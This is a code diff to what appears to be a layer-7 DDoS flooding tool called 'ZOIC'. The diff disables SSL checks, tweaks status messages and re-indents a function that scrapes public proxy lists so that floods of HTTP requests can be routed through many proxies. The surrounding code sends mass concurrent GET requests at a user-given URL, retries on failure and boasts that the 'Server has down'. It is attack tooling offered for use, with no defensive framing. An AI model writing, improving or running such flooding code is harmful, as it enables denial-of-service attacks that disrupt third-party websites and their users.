@@ -161,7 +161,8 @@ def layer7():
                             await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
-                async with aiohttp.ClientSession() as session:
+                connector = aiohttp.TCPConnector(ssl=False)
+                async with aiohttp.ClientSession(connector=connector) as session:
                     tasks = [send_request(session, url) for _ in range(get_request)]
                     await asyncio.gather(*tasks)
 
@@ -327,7 +328,7 @@ def layer7():
                     }
                     try:
                         response = await client.get(url, headers=headers)
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HTTP 2.0 Request : {get_request} Status : {response.status_code}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status_code}"))
                     except aiosonic.exceptions.HttpParsingError:
                         print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                         if retries > 0:
@@ -377,14 +378,14 @@ def layer7():
 
         elif select == "pxreq" or select.lower() == "p":
             def proxy_hunter(url):
-                proxies = []
-                try:
-                    response = requests.get(url, timeout=5)
-                    proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)  
-                    proxies.extend(proxy_list)
-                except Exception as e:
-                    print(f"Error : {e}")
-                return proxies
+                    proxies = []
+                    try:
+                        response = requests.get(url, timeout=5)
+                        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)  
+                        proxies.extend(proxy_list)
+                    except Exception as e:
+                        print(f"Error : {e}")
+                    return proxies
 
             all_proxies = []
             for site in proxy_sites:
@@ -398,7 +399,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] PROXY Request : {proxy}:{url} Status : {response.status}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} Proxy Request : {proxy} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -435,8 +436,9 @@ def layer7():
                     thread.start()
                     threads.append(thread)
 
-                    while True:
-                        time.sleep(0.1) 
+
+                while True:
+                    time.sleep(0.1)  
 
             url = input(Colorate.Horizontal(Colors.green_to_blue,"""
 ╔═══[root@URL]~$
@@ -451,6 +453,7 @@ def layer7():
             print(Colorate.Horizontal(Colors.green_to_blue,f"""
 ╔═══[root@PROXY]~$
 ╚══> {len(all_proxies)}"""))
+
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
 
             start_threads(url, all_proxies, num_threads, get_request)
@@ -531,7 +534,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:  
-                          print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))                                         
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))                                     
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
